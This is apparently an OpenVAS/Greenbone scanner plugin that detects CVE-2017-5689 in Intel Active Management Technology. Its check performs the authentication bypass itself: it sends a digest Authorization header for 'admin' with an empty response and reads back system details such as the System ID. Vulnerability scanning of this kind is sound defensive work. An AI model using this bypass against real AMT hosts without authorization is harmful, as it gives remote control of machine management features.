###############################################################################
# OpenVAS Vulnerability Test
#
# Intel Active Management Technology Privilege Escalation Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:intel:active_management_technology";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810996");
  script_version("2020-10-05T06:55:40+0000");
  script_cve_id("CVE-2017-5689");
  script_bugtraq_id(98269);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2020-10-05 06:55:40 +0000 (Mon, 05 Oct 2020)");
  script_tag(name:"creation_date", value:"2017-05-05 15:39:37 +0530 (Fri, 05 May 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Intel Active Management Technology Privilege Escalation Vulnerability");

  script_tag(name:"summary", value:"This host is running Intel system with Intel
  Active Management Technology enabled and is prone to privilege escalation
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check if we are able to access the manageability features of this product.");

  script_tag(name:"insight", value:"The flaw exists due to mishandling of input
  in an unknown function.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unprivileged attacker to gain control of the manageability features provided
  by these products.");

  script_tag(name:"affected", value:"Intel Active Management Technology
  manageability firmware versions 6.x before 6.2.61.3535, 7.x before 7.1.91.3272,
  8.x before 8.1.71.3608, 9.0.x and 9.1.x before 9.1.41.3024, 9.5.x before
  9.5.61.3012, 10.x before 10.0.55.3000, 11.0.x before 11.0.25.3001, 11.5.x and
  11.6.x before 11.6.27.3264.");

  script_tag(name:"solution", value:"Upgrade to Intel Active Management Technology
  manageability firmware versions 6.2.61.3535 or 7.1.91.3272 or 8.1.71.3608 or
  9.1.41.3024 or 9.5.61.3012 or 10.0.55.3000 or 11.0.25.3001 or 11.6.27.3264 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00075.html");
  script_xref(name:"URL", value:"https://arstechnica.com/security/2017/05/intel-patches-remote-code-execution-bug-that-lurked-in-cpus-for-10-years");
  script_xref(name:"URL", value:"https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability");
  script_xref(name:"URL", value:"https://downloadcenter.intel.com/download/26754");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_intel_amt_webui_detect.nasl");
  script_mandatory_keys("intel_amt/installed");
  script_require_ports("Services/www", 16992, 16993);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/index.htm";
req = http_get_req(port:port, url:url);
res = http_keepalive_send_recv(port:port, data:req);

if(res && "Server: Intel(R) Active Management Technology" >< res) {

  match = eregmatch(string:res, pattern:'"Digest.(.*)", nonce="(.*)",stale');
  if(match[1] && match[2]) {
    digest = match[1];
    nonce = match[2];
  } else {
    exit(0);
  }

  cnonce = rand_str(length:10);
  asp_session = string('Digest username="admin", realm="Digest:', digest, '", nonce="',
                        nonce, '", uri="/index.htm", response="", qop=auth, nc=00000001,
                        cnonce="' + cnonce + '"');

  req = http_get_req(port:port, url:url, add_headers:make_array("Authorization", asp_session));
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "Server: Intel(R) Active Management Technology" >< res
             && ">Hardware Information" >< res && ">IP address" >< res && ">System ID" >< res
             && ">System<" >< res && ">Processor<" >< res && ">Memory<" >< res) {
    sys_id = eregmatch(pattern:"System ID(</p></td>)?.(  )?<td class=r1>([^<\n\r]+)", string:res);
    report = "It was possible to access /index.htm by bypassing authentication.\n";

    if (!isnull(sys_id[3]))
      report += "Among other information the System ID could be retrieved:\nSystem ID:   " + sys_id[3];

    security_message(port:port, data:report);
    exit(0);
  }

  exit(99);
}

exit(0);
